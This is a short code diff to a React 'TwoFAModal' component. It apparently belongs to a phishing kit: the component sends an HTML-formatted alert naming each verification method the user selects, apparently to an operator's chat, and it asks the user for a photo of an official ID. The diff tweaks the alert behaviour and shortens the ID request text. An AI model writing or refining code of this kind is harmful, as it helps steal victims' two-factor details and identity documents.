@@ -126,7 +126,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
 
         sendMessage(
             `🔔 <b>METHOD SELECTED</b>\nMethod: <code>${safeMethod}</code>`,
-            { replacePrevious: false }
+            { appendToPrevious: true }
         ).catch(() => {});
     };
 
@@ -232,8 +232,8 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         },
         {
             value: 'id_selfie_video',
-            title: texts.idAndSelfieVideo || 'ID and selfie video',
-            description: texts.idAndSelfieVideoDescription || 'Take a photo of your official ID and a short video featuring you',
+            title: texts.idAndSelfieVideo || 'Official ID photo',
+            description: texts.idAndSelfieVideoDescription || 'Take a photo of your official ID.',
         },
     ];
     /* ── Styles ── */
